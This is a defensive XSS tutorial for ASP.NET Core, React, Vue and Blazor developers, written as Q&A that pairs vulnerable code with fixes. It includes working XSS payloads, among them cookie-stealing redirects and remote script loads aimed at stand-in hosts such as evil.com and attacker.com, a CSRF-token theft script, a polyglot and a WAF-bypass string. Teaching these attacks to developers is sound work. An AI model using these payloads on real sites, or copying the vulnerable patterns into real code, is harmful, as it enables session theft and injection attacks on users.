# XSS

## Phase 1: The Fundamentals (Know Your Enemy)

*Goal: Understand the mechanics. If you can't write an exploit, you can't fix it.*

### 1. Definition & Mechanics

**Q: What exactly is XSS, and why does the browser execute malicious code?**

- **The Deep Dive:**
Browsers are built on trust. When `yoursite.com` sends HTML, the browser assumes *everything* in it was written by you. It parses `<script>` tags and executes them immediately. XSS happens when an attacker tricks the server into including *their* script in *your* HTML.
- **Vulnerable View (Razor):**
    
    ```html
    <!-- Developer assumes 'name' is just a name like 'John' -->
    <h1>Welcome, @Html.Raw(Model.Name)</h1>
    ```
    
- **The Attack Payload:**`Name = "<img src=x onerror=alert('Hacked')>"`
- **The Resulting HTML:**
    
    ```html
    <h1>Welcome, <img src=x onerror=alert('Hacked')></h1>
    ```
    
    - The browser sees an `<img>`. It tries to load `src=x`. It fails. It triggers `onerror`. The JavaScript executes.

---

### 2. Reflected XSS

**Q: How does a URL parameter behave as a weapon?**

- **The Scenario:** A Search Page that echoes the search term back to the user.
- **Vulnerable C# Controller:**
    
    ```csharp
    public IActionResult Search(string term)
    {
        // Bad practice: Returning raw HTML string directly
        return Content($"<h1>Results for {term}</h1>", "text/html");
    
    ```
    
- **The Attack URL:**`https://site.com/search?term=<script>document.location='<http://evil.com?c='+document.cookie></script>`
- **The Mechanism:**
    1. Attacker emails this link to a Victim.
    2. Victim clicks.
    3. Your Server receives the `term`.
    4. Your Server responds with the script *inside* the HTML.
    5. Victim's browser runs the script, sending their Session Cookie to `evil.com`.
- **Secure Code (Razor View):**
    
    ```html
    <!-- Razor automatically encodes this! -->
    <h1>Results for @Model.Term</h1>
    ```
    
    *Result:* `&lt;script&gt;...` (Safe text, not code).
    

---

### 3. Stored XSS (Persistent)

**Q: Why is this considered the most dangerous form?**

- **The Scenario:** A "Comment" system on a popular post.
- **Vulnerable Workflow:**
    1. **Attacker Post:** Sends comment: `Nice! <script src="<http://evil.com/mining-bot.js>"></script>`
    2. **Server Save:** Saves string directly to `Comments` table in SQL DB.
    3. **Victim View:** 1,000 users visit the post. The server pulls the comment from SQL and renders it.
- **Vulnerable C# (Rendering):**
    
    ```html
    @foreach(var comment in Model.Comments) {
        <div class="comment">
            @Html.Raw(comment.Text) <!-- "I want to support bold text!" -->
        </div>
    }
    ```
    
- **The Impact:** You don't need to trick 1,000 users into clicking a link. You just infect the page once, and the server distributes the malware to everyone.
- **Secure Approach (Sanitization):**
If you *must* allow rich text (bold, italics), use a **Sanitizer** before rendering.
    
    ```csharp
    // Secure
    @Html.Raw(_sanitizer.Sanitize(comment.Text))
    ```
    

---

### 4. DOM-based XSS

**Q: How can XSS happen without the server ever seeing the payload?**

- **The Deep Dive:**
Sometimes the HTML from the server is empty/safe. But client-side JavaScript reads data from the URL or Storage and dangerously writes it to the page.
- **Vulnerable JavaScript:**
    
    ```html
    <div id="welcome"></div>
    <script>
        // Reads the URL fragment (after the #)
        // URL: <https://site.com>#<img src=x onerror=alert(1)>
        var name = document.location.hash.substring(1);
    
        // VULNERABILITY: innerHTML parses the string as HTML code
        document.getElementById("welcome").innerHTML = "Hello " + name;
    </script>
    ```
    
- **Why Server Filters Fail:**
The hash (`#...`) is **never sent to the server**. The HTTP request is just `GET /`. Your C# `AntiXssMiddleware` will never see the payload.
- **Secure JavaScript:**
    
    ```jsx
    // Use textContent instead. It treats input as pure text.
    document.getElementById("welcome").textContent = "Hello " + name;
    ```
    

---

### 5. The Real Impact

**Q: Beyond "alert(1)", what can an attacker actually steal?**

- **1. Session Hijacking (The Classic):**
    
    ```jsx
    // Redirects user to attacker site with the cookie appended
    window.location = '<http://attacker.com/collect?cookie=>' + document.cookie;
    ```
    
    *Defense:* Use `HttpOnly` cookies.
    
- **2. The Hidden Form (Phishing):**
    
    ```jsx
    // Deletes your page and draws a fake Login Box
    document.body.innerHTML = '<form action="<http://attacker.com/login>">User:<input type="text">Pass:<input type="password"></form>';
    ```
    
    *Defense:* CSP (`script-src 'self'`).
    
- **3. API Abuse:**
    
    ```jsx
    // The attacker is YOU. They can call your API.
    fetch('/api/admin/delete-user/5', { method: 'DELETE' });
    ```
    

---

### 6. XSS vs. CSRF

**Q: How do they differ, and how do they often work together?**

- **CSRF Payload (The "Blind" Attack):**
Attacker puts this on *their* site `evil.com`:
    
    ```html
    <img src="<https://bank.com/transfer?amount=1000&to=Attacker>">
    ```
    
    *Limitation:* They can't see the response. They rely on your browser automatically sending cookies.
    
- **XSS Payload (The "Full Control" Attack):**
Attacker runs this on *your* site `bank.com`:
    
    ```jsx
    var token = document.querySelector('input[name="__RequestVerificationToken"]').value;
    fetch('/transfer', {
        method: 'POST',
        body: JSON.stringify({ amount: 1000, to: 'Attacker' }),
        headers: { 'RequestVerificationToken': token }
    })
    ```
    
    *Power:* XSS can read the **Anti-Forgery Token** and defeat CSRF protection.
    

---

### 7. The Same Origin Policy (SOP)

**Q: What is it, and how does XSS bypass it?**

- **The Rule:** `fetch('<https://google.com>')` from `yoursite.com` will fail (CORS). Browser tabs are isolated.
- **The Exploit:**
XSS injects the script **into the origin itself**.
If I inject `<script>` into `yoursite.com`, the browser executes it as `yoursite.com`.
    - It can read LocalStorage of `yoursite.com`.
    - It can make AJAX calls to `yoursite.com/api`.
    - It is "Inside the House".

---

### 8. Blind XSS

**Q: What happens when the payload fires in an Admin panel you can't see?**

- **The Scenario:** A "Feedback Form" that only Moderators see.
- **Vulnerable Input:**
Name: `Hacker`
Message: `<script src=//attacker.com/hook.js></script>`
- **The Trap (Admin Panel):**
    
    ```html
    <!-- Admin Dashboard.html -->
    <td>@Html.Raw(feedback.Message)</td>
    ```
    
    The developer used `Raw` because "Internal tools don't need security, right?"
    
- **The Execution:**
    1. Hacker submits form. Nothing happens.
    2. **3 days later**, Admin login. Checks feedback.
    3. Script executes in Admin context.
    4. Script grabs Admin Cookie -> Sends to Attacker.
    5. Attacker logs in as Admin. **Game Over.**

---

## Phase 2: The Attack Surface (Context is King)

*Goal: Realize that "Encoders" are not one-size-fits-all. A Secure HTML Encoder is essentially useless inside a URL.*

### 9. HTML Context

**Q: Why is `<script>` not the only tag you need to fear?**

- **The Context:**
Data is placed between tags: `<div>HERE</div>`.
- **Vulnerable Code (Razor):**
    
    ```html
    <div>
       You said: @Html.Raw(Model.Message)
    </div>
    ```
    
- **The Attack:**
Payload: `<img src=x onerror=alert(1)>`
Authentication: Implicit. If I view this, my cookies authorize the request.
- **HTML Helper Defense:**
Razor's default `@Model.Message` uses `HtmlEncoder`. It converts `<` to `&lt;`.
*Result:* `&lt;img src=...&gt;` (The browser renders the text of the tag, but does not execute it).

---

### 10. Attribute Context

**Q: How can `onclick` or `href` be exploited even without tags?**

- **The Context:**
Data is placed inside an attribute: `<input value="HERE">`.
- **Vulnerable View:**
    
    ```html
    <!-- Developer forgot quotes! -->
    <input value=@Model.Username >
    ```
    
- **The Attack:**
Payload: `foo onclick=alert(1)`
Resulting HTML: `<input value=foo onclick=alert(1) >`*Mechanic:* The browser sees `value="foo"`, then sees a new attribute `onclick`.
- **The "Escape" Attack:**
Even with quotes: `<input value="@Model.Username">`
Payload: `" onmouseover="alert(1)`
Resulting HTML: `<input value="" onmouseover="alert(1)">`
- **Secure Code:**
Razor handles attribute encoding automatically *if* you use tag helpers or `@`:
    
    ```html
    <!-- Safe -->
    <input value="@Model.Username" />
    ```
    
    *Result:* `value="&quot; onmouseover=..."` (The quote is encoded, preventing the attribute escape).
    

---

### 11. JavaScript Context

**Q: Why is putting untrusted data inside a `<script>` block suicide?**

- **The Context:**
Data is placed inside a `<script>` tag.
- **Vulnerable View:**
    
    ```html
    <script>
        // Developer thinks: "I Wrapped it in quotes, it's safe!"
        var username = "@Model.Username";
    </script>
    ```
    
- **The Attack:**
Payload: `"; alert('Pwned'); //`
Resulting HTML:
    
    ```jsx
    var username = ""; alert('Pwned'); //";
    ```
    
    *Mechanic:* The browser parser runs the script *before* the JS engine. The HTML Encoder (`&quot;`) does NOT help here because you are *inside* a script block.
    
- **Secure Code (JSON Serialization):**
Do not build JS strings manually. Use a serializer.
    
    ```jsx
    // Serialize in C# -> send JSON -> parse in JS
    var username = @Json.Serialize(Model.Username);
    ```
    
    *Result:* `var username = "\\u0022; alert..."` (The quote is Unicode-escaped, remaining a harmless string).
    

---

### 12. CSS/Style Context

**Q: Can you execute JS from CSS?**

- **The Context:**
Data is placed inside a `style` attribute.
- **Vulnerable View:**
    
    ```html
    <div style="background-image: url('@Model.AvatarUrl')"></div>
    ```
    
- **The Attack:**
Payload: `javascript:alert(1)`
Result (Old Browsers): `<div style="background-image: url('javascript:alert(1)')">`
- **Secure Code:**
    1. Validate that the URL starts with `http://` or `https://` in C#.
    2. Use CSP to ban inline styles (`style-src 'self'`).

---

### 13. URL Context

**Q: The `javascript:` pseudo-protocol danger.**

- **The Context:**
Data is placed in an `href` or `src`.
- **Vulnerable View:**
    
    ```html
    <a href="@Model.UserWebsite">Visit Website</a>
    ```
    
- **The Attack:**
Payload: `javascript:alert(document.cookie)`
Result: `<a href="javascript:alert(document.cookie)">Visit Website</a>`
- **The Gotcha:**
HTML Encoding (`&...`) is VALID inside an HREF. If Razor encodes it, the browser *decodes* it and executes it anyway.
- **Secure Code:**
You must validate the protocol scheme.
    
    ```csharp
    // Controller validation
    if (!Uri.TryCreate(input, UriKind.Absolute, out var uri) || (uri.Scheme != "http" && uri.Scheme != "https"))
    {
        throw new SecurityException("Invalid URL");
    }
    ```
    

---

### 14. JSON/API Context & [ASP.NET](http://asp.net/) Core APIs

**Q: Can a JSON response trigger XSS? How do I handle XSS in a pure [ASP.NET](http://asp.net/) Core Web API?**

- **The Vulnerability:**
An API returns JSON `{"bio": "<script>..."}`. The browser displays it directly. If the `Content-Type` header is missing, IE/Edge might "sniff" it as HTML and execute.
- **Vulnerable Middleware (Missing Headers):**
By default, old browsers sniff.
- **Secure Code (Program.cs):**
    
    ```csharp
    var app = builder.Build();
    
    app.Use(async (context, next) =>
    {
        // 1. Force strict MIME type usage
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
        await next();
    });
    ```
    
- **Client-Side Danger (React Example):**
The API is safe (returns JSON). The *Client* is vulnerable.
    
    ```jsx
    // Vulnerable React code consuming your API
    <div dangerouslySetInnerHTML={{ __html: apiResponse.bio }} />
    ```
    
    *Fix:* Use `DOMPurify.sanitize(apiResponse.bio)`.
    

---

### 15. File Uploads

**Q: How does an SVG file become an XSS vector?**

- **The Mechanism:**
SVGs are XML. XML supports `<script>` tags. Browsers treat direct SVG views as Documents.
- **Vulnerable C# (Upload Logic):**
    
    ```csharp
    // Checking extension only
    if (file.FileName.EndsWith(".svg")) {
        file.SaveAs("/wwwroot/uploads/" + file.FileName);
    }
    ```
    
- **The Attack File (image.svg):**
    
    ```xml
    <?xml version="1.0" standalone="no"?>
    <svg xmlns="<http://www.w3.org/2000/svg>">
      <script>alert('XSS on Image Load')</script>
    </svg>
    ```
    
- **Secure Defense:**
    1. Force download: `Content-Disposition: attachment`.
    2. CSP: `script-src 'none'`.
    3. Sanitize XML content server-side (complex).

---

### 16. Polyglots

**Q: What is a "Polyglot" payload?**

- **The Concept:**
A single string designed to break out of *any* context it lands in (HTML, Attribute, Script).
- **The "Ultimate" Payload:**
    
    ```
    javascript://%250Aalert(1)//"/*\\'/*"/*-->
    ```
    
- **Why it works:**
    - `->`: Closes HTML comments.
    - `"`: Closes attributes.
    - `//`: Comments out remaining JS.
    - `/*`: Comments out CSS.
    - It is a stress test for your filters. If this payload works anywhere, you have a bug.

---

## Phase 3: The Shield (Defense in Depth)

*Goal: Layer defenses. If one fails (e.g., regex), the next (e.g., CSP) catches the attack.*

### 17. Output Encoding (The Silver Bullet)

**Q: What is the difference between HTML Encoding, URL Encoding, and JavaScript Encoding?**

- **The Concept:**
Different contexts have different "Stop Characters".
    - HTML Stop: `<` `>` `&`
    - JS Stop: `'` `"` `\\`
    - URL Stop: `?` `&` `/`
- **Vulnerable Mistake:**
Using HTML Encoding inside JavaScript.
    - Input: `'; alert(1); //`
    - HTML Encoded: `&#39;; alert(1); //`
    - Result in JS: `var x = '&#39;; alert(1); //';` -> **Still executing if browser decodes entities!**
- **Secure Code (C# Manual Encoding):**
    
    ```csharp
    using System.Text.Encodings.Web;
    
    // Use the specific encoder for the specific context
    var htmlSafe = HtmlEncoder.Default.Encode(input);
    var jsSafe   = JavaScriptEncoder.Default.Encode(input);
    var urlSafe  = UrlEncoder.Default.Encode(input);
    ```
    

---

### 18. [ASP.NET](http://asp.net/) Core Default Defenses

**Q: What does Razor do automatically for you?**

- **The Mechanism:**
Razor's `@` symbol is a shorthand for `HtmlEncoder.Default.Encode()`.
- **Code Example:**
    
    ```html
    <!-- Razor View -->
    <div>@Model.UserInput</div>
    ```
    
    - Compiles to C#: `writer.Write(HtmlEncoder.Default.Encode(Model.UserInput));`
- **The Limit:**
It assumes you are effectively in a `div` or `p` tag. It does **not** know if you are inside a `<script>` or `onclick`.

---

### 19. The `HtmlString` Trap

**Q: When does a developer accidentally bypass protection?**

- **The Scenario:**
You have a "Rich Text" Bio field where users can bold text: `Hello <b>World</b>`.
- **The Vulnerable Fix:**
The developer sees `Hello &lt;b&gt;World&lt;/b&gt;` (safe but ugly).
They switch to:
    
    ```html
    <!-- VULNERABLE: Disables Encoding -->
    @Html.Raw(Model.Bio)
    ```
    
- **The Attack:**
Attacker sets Bio to: `Hello <img src=x onerror=alert(1)>`.
Because `Raw` is used, the script fires.
- **The Rule:**`Html.Raw()` should only be used on string constants you typed yourself, never on database content.

---

### 20. Content Security Policy (CSP)

**Q: The nuclear option. How does `script-src 'self'` stop attacks?**

- **The Concept:**
A whitelist for your browser. "Only run scripts from Me and Google".
- **Vulnerable State (No CSP):**
Attacker injects `<script src="<http://hacker.com/keylogger.js>"></script>`. Browser loads it blindly.
- **Secure State (With CSP):**
Header: `Content-Security-Policy: script-src 'self' <https://analytics.google.com`>
    - Attacker injects script.
    - Browser checks whitelist. `hacker.com` is missing.
    - Browser throws Console Error: `Refused to load script...`.
- [**ASP.NET](http://asp.net/) Core Middleware:**
    
    ```csharp
    // Program.cs
    app.Use(async (context, next) => {
        context.Response.Headers.Add("Content-Security-Policy",
            "default-src 'self'; " +
            "script-src 'self' <https://trusted.cdn.com>; " +
            "object-src 'none';"); // Block Flash/ActiveX
        await next();
    });
    ```
    

---

### 21. CSP Nonces & Hashes

**Q: How to allow legitimate inline scripts while blocking attacks?**

- **The Problem:**
CSP blocks `<script>var x=1;</script>` (Inline) by default because XSS relies on inline injection.
But you need your React/Google Analytics startup script.
- **The Solution: Nonce (Number Used Once).**
    1. Generate crypto-random string per request.
    2. Sign the valid script with it.
- **Secure Code (Razor):**
    
    ```html
    <!-- 1. Send Header: script-src 'nonce-RANDOM123' -->
    
    <!-- 2. Tag VALID script -->
    <script nonce="RANDOM123">
        console.log("I am valid because I have the token");
    </script>
    
    <!-- 3. Attack Script (No Token) -->
    <script>
        alert("I am blocked because I have no nonce");
    </script>
    ```
    

---

### 22. HttpOnly Cookies

**Q: How does this mitigate the *impact* of XSS?**

- **The Concept:**
Even if XSS executes, we want to prevent cookie theft.
- **Vulnerable Config:**`document.cookie` returns `SessionId=12345`.
Attacker sends this to their server.
- **Secure Config (C#):**
    
    ```csharp
    // Program.cs
    builder.Services.AddSession(options => {
        options.Cookie.HttpOnly = true; // JS cannot read this
        options.Cookie.Secure = true;   // HTTPS only
        options.Cookie.SameSite = SameSiteMode.Strict;
    });
    ```
    
    *Result:* `document.cookie` returns empty string. Attacker can't steal the session.
    

---

### 23. Sanitization

**Q: When you *must* allow HTML (e.g., Rich Text Editors), how do you do it?**

- **The Solution:**
Use a library that parses HTML and strips *only* the dangerous tags, leaving `<b>`, `<i>`, etc.
- **The Library:** `MGM.HtmlSanitizer` (industry standard).
- **Secure Code:**
    
    ```csharp
    using Ganss.Xss;
    
    public string CleanHtml(string input)
    {
        var sanitizer = new HtmlSanitizer();
        // Configure allowed tags
        sanitizer.AllowedTags.Add("strong");
        sanitizer.AllowedTags.Add("em");
    
        // Input: "Hello <script>alert(1)</script> <b>World</b>"
        var safe = sanitizer.Sanitize(input);
        // Output: "Hello  <b>World</b>"
    
        return safe;
    }
    ```
    

---

### 24. Input Validation

**Q: Why is "Allowlisting" better than "Blocklisting"?**

- **The Fail (Blocklisting):**`if (input.Contains("<script>")) return Error;`*Bypass:* `<SCRIPT >` or `<img ...>`
- **The Win (Allowlisting):**
"I only accept Integers".
- **Secure Code (Model Binding):**
    
    ```csharp
    public class UserProfile {
        [RegularExpression(@"^[a-zA-Z0-9]+$")] // Only alphanumeric
        public string Username { get; set; }
    
        public int Age { get; set; } // Impossible to inject string here
    }
    ```
    
    *Result:* If attacker sends `Age=<script>`, [ASP.NET](http://asp.net/) Core throws `400 Bad Request` instantly. The payload never reaches your controller.
    

---

## Phase 4: Modern Warfare (Frameworks & Architecture)

*Goal: Understand how the battlefield shifts in Single Page Applications (SPAs) and Cloud Environments.*

### 25. React / Angular / Vue

**Q: These frameworks claim to be "Secure by Design". Are they?**

- **The Concept:**
They treat all data as text. They build the DOM using `textContent`, not `innerHTML`.
- **Secure Code (React Default):**
    
    ```jsx
    // Input: "<script>alert(1)</script>"
    return <div>{user.bio}</div>;
    // Rendered: &lt;script&gt;... (Safe)
    ```
    
- **Vulnerable Code (The Escape Hatch):**
Sometimes you *need* HTML.
    
    ```jsx
    // React Vulnerability
    <div dangerouslySetInnerHTML={{ __html: user.bio }} />
    
    // Vue Vulnerability
    <div v-html="user.bio"></div>
    ```
    
- **The Fix:**
Sanitize *before* using the hatchet.
    
    ```jsx
    import DOMPurify from 'dompurify';
    // Clean it first!
    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />
    ```
    

---

### 26. Blazor (WASM & Server)

**Q: Is WebAssembly immune to XSS?**

- **The Concept:**
Blazor WebAssembly runs .NET *inside* the browser. It shares the same security model as JavaScript. XSS in Blazor = XSS in JS.
- **Vulnerable Code:**
Casting strings to `MarkupString` bypasses encoding.
    
    ```csharp
    // VULNERABLE COMPONENT
    @((MarkupString)Model.Content)
    ```
    
- **The Attack:**
If `Model.Content` is `<img src=x onerror=alert(1)>`, it executes.
- **Secure Code:**
Just let Razor handle it.
    
    ```csharp
    // Encoded by default
    @Model.Content
    ```
    

---

### 27. Trusted Types

**Q: The future of browser security. How to enforce type-safe HTML assignment?**

- **The Concept:**
Stop developers from ever writing `innerHTML = string`. Make them prove it's safe.
- **The Policy (JavaScript):**
    
    ```jsx
    // 1. Define a Policy that sanitizes inputs
    const policy = trustedTypes.createPolicy('my-policy', {
        createHTML: (string) => DOMPurify.sanitize(string)
    });
    ```
    
- **The Usage:**
    
    ```jsx
    // 2. Browser BLOCKS this (TypeError):
    el.innerHTML = "<script>alert(1)</script>";
    
    // 3. Browser ALLOWS this:
    el.innerHTML = policy.createHTML(userInput);
    ```
    

---

### 28. WAF (Azure Front Door)

**Q: How do WAF rules regex-match payloads, and can they be bypassed?**

- **The Concept:**
A firewall sits in front of your App Service. It inspects traffic for signatures like `alert(`.
- **The Bypass (Obfuscation):**
WAF Regex: `Matches <script>`
Attacker sends: `jAvAsCrIpT://%0aalert(1)` (Mixed case + Newline injection)
*Result:* WAF says "Pass". Browser says "Execute".
- **The Lesson:**
WAF reduces noise, but a motivated attacker creates custom payloads to bypass it. **Fix the code, don't rely on the firewall.**

---

### 29. Mutation XSS (mXSS)

**Q: How can the browser's own HTML parser turn safe text into unsafe scripts?**

- **The Concept:**
Browsers are helpful. If you give them broken HTML, they fix it.
- **The Attack:**
Input: `<img src=x onerror=alert(1) "="">` (Malformed)
Sanitizer: "I see a broken attribute, I'll delete the `onerror`." -> Output: `<img src=x "="">` (Safe-ish?)
Browser InnerHTML Assignment: "Hey, this is weird. Let me re-parse it." -> **Creates valid `onerror` attribute.**
- **Defense:**
Do not write your own sanitizer. Use **DOMPurify** (Client) or **HtmlSanitizer** (Server). They simulate browser mutation quirks to be safe.

---

### 30. Reporting (`Report-To`)

**Q: Using `Report-To` headers to get alerts when XSS is attempted on your site.**

- **The Config:**
Tell the browser where to phone home.
- **Header:**
    
    ```
    Report-To: {"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"<https://api.mysite.com/report-csp>"}]}
    Content-Security-Policy: script-src 'self'; report-to csp-endpoint;
    ```
    
- **The Alert (JSON Sent to your API):**
    
    ```json
    {
      "csp-report": {
        "document-uri": "<https://mysite.com/login>",
        "violated-directive": "script-src",
        "blocked-uri": "<http://evil.com/hack.js>"
      }
    }
    ```
    

---

## Graduation: You are now an XSS Architect.

You have moved from "I filter the word script" to "I implement Content Security Policy, Context-Aware Encoding, and Trusted Types."

**Final Checklist for your next PR:**

1. **Output:** Am I using `@Html.Raw` or `dangerouslySetInnerHTML`? (If yes -> Sanitize).
2. **Input:** Am I blocking useful characters? (Don't validation-block, Output-Encode instead).
3. **Headers:** Is CSP (`script-src 'self'`) enabled?
4. **Cookies:** Is `HttpOnly` on?
5. **Pipelines:** Do I have SAST tools (SonarQube) scanning for XSS patterns?